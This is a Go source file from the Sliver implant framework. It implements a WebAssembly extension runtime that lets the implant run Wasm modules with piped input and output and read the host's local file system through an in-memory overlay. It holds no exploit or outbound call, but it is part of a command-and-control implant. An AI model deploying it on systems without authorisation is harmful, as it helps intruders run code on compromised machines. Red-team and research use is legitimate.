//go:build (windows && (amd64 || 386)) || (darwin && (arm64 || amd64)) || (linux && (amd64 || 386))

package extension

/*
	Sliver Implant Framework
	Copyright (C) 2023  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"bytes"
	"context"
	"fmt"
	"io"
	"io/fs"
	"os"
	"path"
	"path/filepath"
	"strings"
	"sync"
	"time"

	// {{if .Config.Debug}}
	"log"
	// {{end}}

	"github.com/tetratelabs/wazero"
	"github.com/tetratelabs/wazero/api"
	wasi "github.com/tetratelabs/wazero/imports/wasi_snapshot_preview1"
	"github.com/tetratelabs/wazero/sys"
)

type wasmPipe struct {
	Reader *io.PipeReader
	Writer *io.PipeWriter
}

// WasmExtension - Wasm extension
type WasmExtension struct {
	Name string
	ctx  context.Context
	lock sync.Mutex

	mod     wazero.CompiledModule
	config  wazero.ModuleConfig
	runtime wazero.Runtime
	closer  api.Closer

	Stdin  *wasmPipe
	Stdout *wasmPipe
	Stderr *wasmPipe
}

// IsExecuting - Check if the Wasm module runtime is currently executing
func (w *WasmExtension) IsExecuting() bool {
	return w.lock.TryLock()
}

// Execute - Execute the Wasm module with arguments, blocks during execution, returns errors
func (w *WasmExtension) Execute(args []string) (uint32, error) {
	w.lock.Lock()
	defer w.lock.Unlock()

	// {{if .Config.Debug}}
	log.Printf("[wasm ext] '%s' execute with args: %s", w.Name, args)
	// {{end}}

	args = append([]string{"wasi"}, args...)
	conf := w.config.WithArgs(args...)
	if _, err := w.runtime.InstantiateModule(w.ctx, w.mod, conf); err != nil {
		// Note: Most compilers do not exit the module after running "_start",
		// unless there was an error. This allows you to call exported functions.
		if exitErr, ok := err.(*sys.ExitError); ok && exitErr.ExitCode() != 0 {
			fmt.Fprintf(w.Stderr.Writer, "exit_code: %d\n", exitErr.ExitCode())
			// {{if .Config.Debug}}
			log.Printf("[wasm ext] '%s' exited with non-zero code: %d", w.Name, exitErr.ExitCode())
			// {{end}}
			return exitErr.ExitCode(), nil
		} else if !ok {
			// {{if .Config.Debug}}
			log.Printf("[wasm ext] '%s' exited with error: %s", w.Name, err.Error())
			// {{end}}
			return 0, err
		}
	}
	return 0, nil
}

// Close - Close the Wasm module
func (w *WasmExtension) Close() error {
	w.Stdin.Reader.Close()
	w.Stdout.Reader.Close()
	w.Stderr.Reader.Close()
	return w.closer.Close(w.ctx)
}

// NewWasmExtension - Create a new Wasm extension
func NewWasmExtension(name string, wasm []byte, memFS map[string][]byte) (*WasmExtension, error) {
	stdinReader, stdinWriter := io.Pipe()
	stdoutReader, stdoutWriter := io.Pipe()
	stderrReader, stderrWriter := io.Pipe()
	wasmExt := &WasmExtension{
		Name: name,
		ctx:  context.Background(),
		lock: sync.Mutex{},

		Stdin:  &wasmPipe{Reader: stdinReader, Writer: stdinWriter},
		Stdout: &wasmPipe{Reader: stdoutReader, Writer: stdoutWriter},
		Stderr: &wasmPipe{Reader: stderrReader, Writer: stderrWriter},
	}
	wasmExt.runtime = wazero.NewRuntime(wasmExt.ctx)
	wasmExt.config = wazero.NewModuleConfig().
		WithStdin(wasmExt.Stdin.Reader).
		WithStdout(wasmExt.Stdout.Writer).
		WithStderr(wasmExt.Stderr.Writer).
		WithFS(makeWasmMemFS(memFS))

	var err error
	wasmExt.closer, err = wasi.Instantiate(wasmExt.ctx, wasmExt.runtime)
	if err != nil {
		return nil, err
	}
	wasmExt.mod, err = wasmExt.runtime.CompileModule(wasmExt.ctx, wasm)
	if err != nil {
		return nil, err
	}
	return wasmExt, nil
}

// makeWasmMemFS - Merge the local filesystem any provided ext files
func makeWasmMemFS(memFS map[string][]byte) fs.FS {
	root := "/"
	cwd, err := os.Getwd()
	if err != nil {
		cwd = "/"
	}
	if vol := filepath.VolumeName(cwd); vol != "" {
		root = vol
	}
	// {{if .Config.Debug}}
	log.Printf("[wasm ext] local filesystem root: %s", root)
	for key := range memFS {
		log.Printf("[wasm ext] memfs file: %s", key)
	}
	// {{end}}

	return WasmMemoryFS{memFS: memFS, localFS: os.DirFS(root)}
}

// WasmMemoryFS - A makeshift read only in-memory virtual file system backed by a map of names
// to bytes the key is the absolute path to the file and the bytes are the contents of the file
// empty directories are not supported.
type WasmMemoryFS struct {
	memFS   map[string][]byte
	tree    *MemFSDirTree
	localFS fs.FS
}

func (w WasmMemoryFS) getTree() *MemFSDirTree {
	if w.tree == nil {

		// {{if .Config.Debug}}
		log.Printf("[memfs] building dir tree ...")
		// {{end}}

		// Build the tree
		w.tree = &MemFSDirTree{Name: "", Subdirs: []*MemFSDirTree{}}
		for key := range w.memFS {
			segs := strings.Split(strings.TrimPrefix(path.Dir(key), "/"), "/")

			// {{if .Config.Debug}}
			log.Printf("[memfs] adding dir tree segments: %s", segs)
			// {{end}}

			w.tree.Insert(segs)

			// {{if .Config.Debug}}
			log.Printf("[memfs] subdirs: %#v", w.tree.Subdirs)
			// {{end}}
		}
	}
	return w.tree
}

// Open - Open a file, the open call is either passed thru to the OS or is redirected to the WasmMemoryFS
func (w WasmMemoryFS) Open(name string) (fs.File, error) {

	// {{if .Config.Debug}}
	log.Printf("[memfs] open '%s'", name)
	// {{end}}

	if memFSPath := w.memFSPath(name); memFSPath != "" {
		name = strings.TrimPrefix(name, "/")
		name = strings.TrimPrefix(name, "memfs")

		// {{if .Config.Debug}}
		log.Printf("[memfs] in memory path >> '%s'", name)
		// {{end}}

		// Any exact path match is a file
		if data, ok := w.memFS[name]; ok {
			buf := bytes.NewBuffer(data)
			return MemoryFSNode{key: name, isDir: false, data: buf}, nil
		}

		// Check to see if the name is a directory
		if w.getTree().Exists(strings.Split(strings.TrimPrefix(name, "/"), "/")) {
			return MemoryFSNode{key: name, isDir: true, data: nil}, nil
		}
		return nil, fs.ErrPermission // Read-only for now
	}
	// cwd, _ := os.Getwd()
	return os.Open(name)
}

// ReadDir - Read a directory, the read call is either passed thru to the OS or is redirected to the WasmMemoryFS
func (w WasmMemoryFS) ReadDir(name string) ([]fs.DirEntry, error) {

	// {{if .Config.Debug}}
	log.Printf("[memfs] read dir '%s'", name)
	// {{end}}

	if memFSPath := w.memFSPath(name); memFSPath != "" {

		memFSPath = strings.TrimPrefix(memFSPath, "/")

		// {{if .Config.Debug}}
		log.Printf("[memfs] path is in memory '%s'", memFSPath)
		// {{end}}

		// Get any file entires
		entries := []fs.DirEntry{}
		for key := range w.memFS {
			dirName := path.Dir(key)
			if dirName == name {
				buf := bytes.NewBuffer(w.memFS[key])
				entries = append(entries, MemoryFSNode{key: key, isDir: false, data: buf})
			}
		}

		// {{if .Config.Debug}}
		log.Printf("[memfs] >>> get entires")
		// {{end}}

		// Get any directory entries
		dirNames := w.getTree().Entries(strings.Split(memFSPath, "/"))

		// {{if .Config.Debug}}
		log.Printf("[memfs] >>> dirNames: %s", dirNames)
		// {{end}}

		for _, dir := range dirNames {
			entries = append(entries, MemoryFSNode{key: dir, isDir: true, data: nil})
		}

		// {{if .Config.Debug}}
		log.Printf("[memfs] >>> read dir: %#v", entries)
		// {{end}}
		return entries, nil
	}
	return os.ReadDir(name)
}

// ReadFile - Read a file, the read call is either passed thru to the OS or is redirected to the WasmMemoryFS
func (w WasmMemoryFS) ReadFile(name string) ([]byte, error) {

	// {{if .Config.Debug}}
	log.Printf("[memfs] read file '%s'", name)
	// {{end}}

	if memFSPath := w.memFSPath(name); memFSPath != "" {
		name = strings.TrimPrefix(name, "/memfs")
		if data, ok := w.memFS[name]; ok {
			return data, nil
		}
		return nil, fs.ErrNotExist
	}
	return os.ReadFile(name)
}

// memFSPath - Returns a blank string for non-memfs paths, or returns the memfs path
func (w WasmMemoryFS) memFSPath(name string) string {
	name = path.Clean(name)
	if !w.isMemFSPath(name) {
		return ""
	}
	if name == "/memfs" || name == "memfs" {
		return "/"
	}
	return name
}

// isMemFSPath - Returns true if the path is a memfs path
func (w WasmMemoryFS) isMemFSPath(name string) bool {
	// We may get passed '/memfs/foo' or 'memfs/foo' so we need to check both
	// and event 'memfs' or 'memfs/' needs to return the root path
	if strings.HasPrefix(name, "/memfs") || strings.HasPrefix(name, "memfs/") {
		return true
	}
	if name == "memfs" {
		return true
	}
	return false
}

// MemFSDirTree - A tree structure for representing only directories in the filesystem
type MemFSDirTree struct {
	Name    string
	Subdirs []*MemFSDirTree
}

// Exists - Should never be passed an empty slice, recursively
// calls exists on each segment until the last segment is reached
func (d *MemFSDirTree) Exists(segs []string) bool {
	if len(segs) <= 1 {
		return d.HasSubdir(segs[0])
	}
	for _, subdir := range d.Subdirs {
		if subdir.Name == segs[0] {
			return subdir.Exists(segs[1:])
		}
	}
	return false
}

// Entires - Recursively resolves and returns a slice of entries in a directory
func (d *MemFSDirTree) Entries(segs []string) []string {

	// {{if .Config.Debug}}
	log.Printf("[memfs] entires arg: %#v", segs)
	// {{end}}

	if len(segs) == 1 {
		entries := []string{}
		for _, subdir := range d.Subdirs {
			entries = append(entries, subdir.Name)
		}

		// {{if .Config.Debug}}
		log.Printf("[memfs] entires: %#v", entries)
		// {{end}}

		return entries
	}
	for _, subdir := range d.Subdirs {
		if subdir.Name == segs[0] {
			return subdir.Entries(segs[1:])
		}
	}
	return []string{}
}

// HasSubdir - Returns true if the directory has a subdir with the given name
func (d *MemFSDirTree) HasSubdir(name string) bool {
	for _, subdir := range d.Subdirs {
		if subdir.Name == name {
			return true
		}
	}
	return false
}

// Insert - Recursively inserts segments of a path into the tree
func (d *MemFSDirTree) Insert(segs []string) {
	if len(segs) == 0 {
		return
	}
	if !d.HasSubdir(segs[0]) {
		newDir := &MemFSDirTree{Name: segs[0], Subdirs: []*MemFSDirTree{}}
		d.Subdirs = append(d.Subdirs, newDir)

		// {{if .Config.Debug}}
		log.Printf("[memfs] inserted dir: %#v", d.Subdirs)
		// {{end}}

		newDir.Insert(segs[1:])
	}
}

// MemoryFSNode - A makeshift in-memory fs.File object
type MemoryFSNode struct {
	key   string
	data  *bytes.Buffer
	isDir bool
}

// Stat - Returns the MemoryNode itself since it implements FileInfo
func (m MemoryFSNode) Stat() (fs.FileInfo, error) {
	return m, nil
}

func (m MemoryFSNode) Info() (fs.FileInfo, error) {
	return m, nil
}

// Read - Standard reader function
func (m MemoryFSNode) Read(buf []byte) (int, error) {
	return m.data.Read(buf)
}

// Close - No-op
func (m MemoryFSNode) Close() error {
	return nil
}

// Name - Returns the name of the file
func (m MemoryFSNode) Name() string {
	return path.Base(m.key)
}

// Size - Returns the size of the file
func (m MemoryFSNode) Size() int64 {
	return int64(m.data.Len())
}

// Mode - Returns the mode of the file
func (m MemoryFSNode) Mode() fs.FileMode {
	return fs.FileMode(0444) // YOLO
}

// Type - Returns the mode of the file
func (m MemoryFSNode) Type() fs.FileMode {
	return fs.FileMode(0444) // YOLO
}

// ModTime - Returns the mod time of the file
func (m MemoryFSNode) ModTime() time.Time {
	return time.Now()
}

// IsDir - Returns true if the file is a directory
func (m MemoryFSNode) IsDir() bool {
	return m.isDir
}

// Sys - Returns nil
func (m MemoryFSNode) Sys() interface{} {
	return nil
}
